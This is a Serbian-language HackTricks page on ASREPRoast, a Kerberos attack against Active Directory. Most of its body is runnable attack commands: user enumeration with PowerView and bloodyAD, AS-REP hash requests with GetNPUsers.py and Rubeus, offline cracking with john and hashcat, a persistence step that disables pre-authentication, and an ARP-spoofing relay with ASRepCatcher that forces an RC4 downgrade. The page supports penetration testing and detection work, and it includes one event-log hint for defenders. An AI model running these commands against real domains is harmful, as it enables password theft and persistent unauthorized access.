# ASREPRoast

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Pridružite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Hakerski Uvidi**\
Uključite se u sadržaj koji istražuje uzbuđenje i izazove hakovanja

**Vesti o Hakovanju u Realnom Vremenu**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Najnovije Najave**\
Budite informisani o najnovijim nagradama za pronalaženje bagova i bitnim ažuriranjima platformi

**Pridružite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i počnite da sarađujete sa vrhunskim hakerima danas!

## ASREPRoast

ASREPRoast je sigurnosni napad koji iskorišćava korisnike koji nemaju **Kerberos pre-authentication required atribut**. Essencijalno, ova ranjivost omogućava napadačima da zatraže autentikaciju za korisnika od Domain Controller-a (DC) bez potrebe za korisnikovom lozinkom. DC zatim odgovara porukom enkriptovanom korisnikovim ključem izvedenim iz lozinke, koju napadači mogu pokušati da dešifruju offline kako bi otkrili korisnikovu lozinku.

Glavni zahtevi za ovaj napad su:

* **Odsustvo Kerberos pre-authentication-a**: Ciljni korisnici moraju imati ovu sigurnosnu funkciju onemogućenu.
* **Povezanost sa Domain Controller-om (DC)**: Napadači moraju imati pristup DC-u kako bi slali zahteve i primili enkriptovane poruke.
* **Opcioni domenski nalog**: Imajući domenski nalog omogućava napadačima efikasnije identifikovanje ranjivih korisnika putem LDAP upita. Bez takvog naloga, napadači moraju da nagađaju korisnička imena.

#### Enumeracija ranjivih korisnika (potrebne domenske akreditacije)

{% code title="Korišćenje Windows-a" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Korišćenje Linux-a" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
{% endcode %}

#### Zahtevaj AS_REP poruku

{% code title="Korišćenje Linux-a" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Korišćenje Windows-a" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP Roasting sa Rubeusom će generisati 4768 sa vrstom šifrovanja 0x17 i vrstom preautentikacije 0.
{% endhint %}

### Krekovanje
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Upornost

Prisilite **preauth** da nije potreban za korisnika za koga imate dozvole **GenericAll** (ili dozvole za pisanje svojstava):

{% code title="Korišćenje Windows-a" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Korišćenje Linux-a" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## ASREProast bez pristupnih podataka

Napadač može koristiti poziciju čoveka u sredini da uhvati AS-REP pakete dok prolaze kroz mrežu, ne oslanjajući se na isključenu Kerberos preautentikaciju. Stoga ova tehnika funkcioniše za sve korisnike na VLAN-u.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nam omogućava da to uradimo. Osim toga, ovaj alat prisiljava klijentske radne stanice da koriste RC4 izmenom pregovora Kerberosa.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Reference

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Pridružite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Hakerski uvidi**\
Uključite se u sadržaj koji istražuje uzbuđenje i izazove hakovanja

**Vesti o hakovanju u realnom vremenu**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Poslednje najave**\
Budite informisani o najnovijim nagradama za pronalaženje bagova i važnim ažuriranjima platforme

**Pridružite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i počnite da sarađujete sa vrhunskim hakerima danas!

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
